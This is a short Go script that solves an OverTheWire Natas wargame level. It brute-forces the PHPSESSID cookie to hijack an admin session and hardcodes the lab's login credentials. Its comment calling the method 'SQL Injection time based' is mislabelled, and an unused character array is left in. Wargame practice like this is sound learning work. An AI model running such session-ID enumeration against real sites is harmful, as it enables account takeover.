package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func main() {
	max := 640
	for index := 0; index < max; index++ {
		if result(strconv.Itoa(index)) {
			break
		}
	}
}

//SQL Injection time based
func result(pass string) bool {

	usr := "natas19"
	psw := "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
	baseURL := "http://" + usr + ".natas.labs.overthewire.org"
	query := "?debug=1&admin=1&username=admin&password=admin"

	client := &http.Client{}
	req, _ := http.NewRequest("GET",
		baseURL+query, nil)
	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
	cookie := http.Cookie{Name: "PHPSESSID", Value: pass}
	req.AddCookie(&cookie)

	//start := time.Now()
	res, _ := client.Do(req)
	//ellapsed := time.Since(start)

	buf := new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	bs := buf.String()
	//fmt.Println(bs)

	fmt.Print(pass, " ")

	if strings.Contains(bs, "You are an admin") {
		fmt.Println(bs)
		return true
	}
	return false

}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
	"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
	"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
